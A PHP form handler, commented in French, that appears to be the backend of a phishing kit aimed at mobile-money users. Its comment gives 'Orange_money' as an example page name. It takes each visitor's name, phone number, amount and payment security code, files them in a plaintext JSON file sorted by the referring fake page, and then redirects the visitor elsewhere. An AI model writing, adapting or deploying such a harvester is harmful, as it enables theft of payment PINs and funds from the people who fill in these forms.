<?php
session_start();

$dataFile = '../data/data.json';

// Identifier la page source (le fichier HTML d'où provient le formulaire)
$pageSource = basename($_SERVER['HTTP_REFERER'], '.html'); // Extrait 'Orange_money' par exemple

// Charger les données existantes du fichier JSON
$jsonData = file_exists($dataFile) ? file_get_contents($dataFile) : '{}';
$data = json_decode($jsonData, true);

// Vérifier si une catégorie existe pour cette page source, sinon la créer
if (!isset($data[$pageSource])) {
    $data[$pageSource] = [];
}

// Ajouter les nouvelles données dans la catégorie correspondante
$newPayment = [
    'name' => $_POST['name'],
    'phone' => $_POST['phone'],
    'currency' => $_POST['currency'],
    'amount' => $_POST['amount'],
    'security_code' => $_POST['security-code'],
    'timestamp' => date('c') // Timestamp au format ISO 8601
];

$data[$pageSource][] = $newPayment;

// Sauvegarder les données mises à jour dans le fichier JSON
file_put_contents($dataFile, json_encode($data, JSON_PRETTY_PRINT));

// Rediriger vers index.html après le traitement
header('Location: ../pages/index.html');
exit();
?>
